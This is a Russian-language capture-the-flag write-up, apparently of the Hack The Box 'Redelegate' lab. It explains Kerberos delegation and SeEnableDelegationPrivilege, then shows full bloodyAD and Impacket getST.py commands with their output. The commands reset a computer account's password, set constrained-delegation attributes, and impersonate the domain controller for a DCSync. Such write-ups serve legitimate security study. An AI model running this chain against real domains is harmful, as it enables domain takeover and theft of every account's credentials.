> [!NOTE] Привилегия `SeEnableDelegationPrivilege`
> 
> **SeEnableDelegationPrivilege** — это привилегия Windows, которая позволяет пользователю **помечать учетные записи пользователей и компьютеров как "Trusted for Delegation" (доверенные для делегирования)**.
> 
> Важно понимать, что **сама по себе эта привилегия не позволяет выполнять делегирование**. Она лишь дает право **включить возможность делегирования для другого объекта Active Directory**.
> 
> **Что такое делегирование**
> 
> В Active Directory делегирование позволяет сервису использовать учетные данные клиента при обращении к другим сервисам.
> Без делегирования схема выглядит так:
>```
> Пользователь
>       │
>       ▼
> Веб-сервер
>       │
>       └────► База данных
>```
> Веб-сервер знает только свою учетную запись и не может представляться пользователем.
> С делегированием:
> ```
> Пользователь
>       │
>       ▼
> Веб-сервер (Trusted for Delegation)
>       │
>       ▼
> База данных
> ```
> Веб-сервер может обращаться к базе данных от имени пользователя, используя его Kerberos-учетные данные.
>
> **Что делает SeEnableDelegationPrivilege**
> 
> Пользователь, обладающий этой привилегией, может изменить соответствующий флаг в объекте Active Directory:
> ```
> TrustedForDelegation
> ```
> или аналогичные параметры делегирования.
> 
> После этого выбранный пользователь или компьютер становится доверенным для делегирования Kerberos-аутентификации. То есть SeEnableDelegationPrivilege позволяет назначать объекты, которым разрешено выполнять делегирование.
> 
> **Что необходимо для работы**
> 
> Одной SeEnableDelegationPrivilege недостаточно.
> Необходимо выполнение нескольких условий.
> 1. Пользователь должен обладать SeEnableDelegationPrivilege
> По умолчанию это:
> - Domain Admins
> - Enterprise Admins
> 2. Пользователь должен иметь право изменять объект AD
> Недостаточно иметь саму привилегию.
> Необходимо также иметь возможность изменить соответствующий объект Active Directory (например, компьютерную учетную запись)(В примере ниже это GenericAll).
> 
> **Документация Microsoft говорит**:
> объект должен предоставлять Write-доступ к Account Control Flags.
> То есть необходимо иметь возможность изменить атрибуты объекта, содержащие флаги управления учетной записью (например, userAccountControl).
> 3. Сам объект должен быть доверенным для делегирования
> После установки флага
> ```
> Trusted for Delegation
> ```
> служба, работающая под этой учетной записью, получает возможность использовать Kerberos-токены клиентов для доступа к другим сервисам.
> Что происходит после включения делегирования
> Предположим:
> ```
> Alice
>     │
>     ▼
> WEB01
>     │
>     ▼
> SQL01
> ```
> Если WEB01 отмечен как Trusted for Delegation, то последовательность выглядит так:
> - Alice проходит Kerberos-аутентификацию на WEB01.
> - WEB01 получает возможность использовать Kerberos-билет Alice.
> - WEB01 обращается к SQL01 от имени Alice.
> - SQL01 считает, что запрос пришел непосредственно от Alice.
> Таким образом пользователь проходит аутентификацию только один раз (Single Sign-On), а сервисы могут безопасно передавать его учетные данные дальше по цепочке.
> 
> **Почему эта привилегия опасна**
> 
> - Если злоумышленник получает SeEnableDelegationPrivilege, он может:
> - назначить произвольную учетную запись доверенной для делегирования;
> - заставить сервис принимать Kerberos-учетные данные пользователей;
> - выдавать себя за других пользователей при обращении к сетевым ресурсам;
> - усложнить расследование инцидента, поскольку действия будут выполняться от имени легитимного пользователя.
> 
> Именно поэтому эта привилегия считается одной из наиболее опасных административных привилегий в Active Directory.

У пользователя `Helen.Frost` есть право `GenericAll` над компьютерной учеткой `FS01`.  Есть несколько вариаций атаки через `SeEnableDelegationPrivilege`, для настройки неограниченного делегирования, нам понадобится добавить DNS-запись, но у нас нет на это прав/ Это означает, что мы не можем настроить неограниченное делегирование, потому что нам нужно заставить машину создать билет Kerberos, что невозможно с IP-адресом; для этого требуется SPN и запись DNS A.(ссылка на [гайд](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html#:~:text=complete%20the%20chain.-,Abusing%20Unconstrained%20Delegation%20with%20an%20attacker%2Dcreated%20computer,-Modern%20domains%20often) по неограниченному повышению)([Статья](https://www.thehacker.recipes/ad/movement/kerberos/delegations/) с разбором ограниченного и неограниченного делегирования). 

Однако, объединив обе неправильные конфигурации, мы можем настроить учетную запись машины FS01$ для выполнения полной атаки S4U2self + S4U2proxy (ограниченное делегирование) на учетную запись машины DC$ и использовать этот сервисный билет для выполнения атаки DCSync.

Сначала меняем пароль компьютерной учетке. 

```
┌──(kali㉿kali)-[~/Desktop/HTB/Redelegate/krbrelayx]
└─$ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set password "FS01$" 'NewPassword123!'
[+] Password changed successfully!
```

После этого настраиваем атрибут  `TRUSTED_TO_AUTH_FOR_DELEGATION`

```
┌──(kali㉿kali)-[~/Desktop/HTB/Redelegate/krbrelayx]
└─$ bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'helen.frost' -p 'NewPassword123!' add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION                                     
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

Настраиваем возможность делегирования указывая на `cifs/dc.redelegate.vl` - это целевой сервер, к которому мы получим доступ, но не учетка от которой(это smb). 

```
┌──(kali㉿kali)-[~/Desktop/HTB/Redelegate/krbrelayx]
└─$ bloodyAD --host 10.129.234.50 -d redelegate.vl -u 'helen.frost' -p 'NewPassword123!' set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

После того, как пароль изменён, атрибут настроен правильным образом, мы используем `getST.py` для атаки на делегирование.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Redelegate/krbrelayx]
└─$ getST.py redelegate.vl/fs01\$:'NewPassword123!' -spn cifs/dc.redelegate.vl -impersonate dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

`getST.py` сначала запрашивает `TGT` для учетной записи компьютера `FS01$`. Далее выполняется `S4U2Self`, в рамках которого `FS01$` запрашивает у KDC сервисный билет к самому себе от имени пользователя `DC$` (это возможно благодаря наличию флага `TRUSTED_TO_AUTH_FOR_DELEGATION`). После этого выполняется `S4U2Proxy`: используя полученный через `S4U2Self` билет и разрешение в `msDS-AllowedToDelegateTo`, `FS01$` запрашивает сервисный билет от имени `DC$` к SPN `cifs/dc.redelegate.vl`. Полученный билет сохраняется в `.ccache` файле.

В результате выполнения `S4U2Self` и `S4U2Proxy` учетная запись `FS01$` получает сервисный билет Kerberos, в котором клиентом является `DC$`, а целевым сервисом — `cifs/dc.redelegate.vl`. Этот билет позволяет `FS01$` аутентифицироваться перед SMB-службой контроллера домена от имени `DC$`, после чего он используется для выполнения DCSync через `secretsdump.py`. [Ссылка](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html#automating-delegation-setup-from-low-priv-creds) на статью с эксплуатацией ограниченного делегирования. 

> [!NOTE] **S4U2Self** и **S4U2Proxy**
> **S4U2Self**
> 
> **S4U2Self** позволяет сервису получить **сервисный билет к самому себе от имени любого пользователя**, даже если этот пользователь не проходил аутентификацию на данном сервисе.
>>«Я — доверенный сервис. Выдай мне билет так, будто пользователь _Alice_ только что обратился ко мне.»
>
>Этот билет **не дает доступа к другим сервисам**. Он лишь подтверждает личность пользователя перед самим сервисом.
>
> Для работы S4U2Self учетная запись сервиса должна иметь флаг:
> ```
> TRUSTED_TO_AUTH_FOR_DELEGATION
> ```
>
> **S4U2Proxy**
> 
> **S4U2Proxy** позволяет сервису, уже имеющему билет пользователя к себе (например, полученный через S4U2Self), запросить у KDC **новый сервисный билет к другому сервису от имени этого пользователя**.
> > «У меня есть билет пользователя Alice ко мне. Теперь выдай мне билет Alice к сервису CIFS/DC.»
> 
> Если целевой SPN указан в атрибуте `msDS-AllowedToDelegateTo`, KDC выдаст новый билет. Именно этот билет сервис использует для обращения к другому сервису от имени пользователя.
